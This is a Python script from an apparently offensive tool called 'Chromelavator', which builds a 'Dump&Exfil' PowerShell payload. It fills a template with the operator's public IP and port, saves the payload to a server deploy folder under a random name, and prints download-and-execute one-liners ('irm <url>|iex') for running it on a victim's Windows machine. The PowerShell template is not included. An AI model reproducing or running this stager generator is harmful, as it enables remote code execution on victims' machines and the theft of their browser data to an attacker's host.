#!/usr/bin/env python3

from common import *
import argparse
import urllib.request
import random
import os
import sys

# Path Setup

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)
DEPLOY_DIR = os.path.join(ROOT_DIR, "server", "deploy")
DEFAULT_TEMPLATE = os.path.join(SCRIPT_DIR, "template.ps1")

# Helpers

def generate_outfile_name() -> str:
    return ''.join(random.choices('0123456789abcdef', k=5))

def load_script(path: str) -> str:
    with open(path, "r") as f:
        return f.read()

def save_script(data: str, path: str) -> None:
    with open(path, "w") as f:
        f.write(data)

def pull_ip() -> str:
    return urllib.request.urlopen("https://checkip.amazonaws.com").read().decode().strip()

# Main

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Auto generate a simple quick Chromelavator Dump&Exfil script."
    )

    parser.add_argument("--template", "-t", default=DEFAULT_TEMPLATE, help="Template file")
    parser.add_argument("--host", "-H", default=pull_ip(), help="Remote Host")
    parser.add_argument("--port", "-p", default="8000", help="Remote Port")

    args = parser.parse_args()

    template_path = args.template
    if not os.path.isabs(template_path):
        template_path = os.path.join(SCRIPT_DIR, template_path)

    if not os.path.exists(template_path):
        failed(f"Template does not exist: {template_path}")
        sys.exit(1)

    os.makedirs(DEPLOY_DIR, exist_ok=True)

    info(f"Loading template ({template_path})")

    deploy_script = (
        load_script(template_path)
        .replace("<HOST>", args.host)
        .replace("<PORT>", args.port)
    )

    file_name = generate_outfile_name()
    full_outpath = os.path.join(DEPLOY_DIR, file_name)

    save_script(deploy_script, full_outpath)
    success(f"[+] Output saved at: {full_outpath}")

    url = f"http://{args.host}:{args.port}/deploy/{file_name}"

    success(f"[+] irm {url}|iex")
    success(f"[+] powershell.exe -c 'irm {url}|iex'")

    info("Done.")

if __name__ == '__main__':
    main()

